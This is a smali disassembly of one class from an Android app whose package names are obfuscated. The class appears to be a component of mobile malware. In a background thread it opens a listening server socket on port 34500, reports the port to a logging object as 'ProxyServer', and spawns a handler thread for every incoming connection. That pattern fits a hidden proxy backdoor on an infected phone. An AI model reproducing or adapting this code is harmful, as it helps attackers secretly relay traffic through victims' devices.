.class Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;->onHandleIntent(Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr$1;->a:Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    :try_start_0
    new-instance v0, Ljava/net/ServerSocket;

    const v1, 0x86c4

    invoke-direct {v0, v1}, Ljava/net/ServerSocket;-><init>(I)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr$1;->a:Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ProxyServer"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Port="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/net/ServerSocket;->getLocalPort()I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    invoke-virtual {v0}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v1

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lwocwvy/czyxoxmbauu/slsa/kuv/a;

    invoke-direct {v3, v1}, Lwocwvy/czyxoxmbauu/slsa/kuv/a;-><init>(Ljava/net/Socket;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr$1;->a:Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/kuv/sfswwunyakpjr;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "PORTERROR"

    const-string v3, "ERROR"

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method
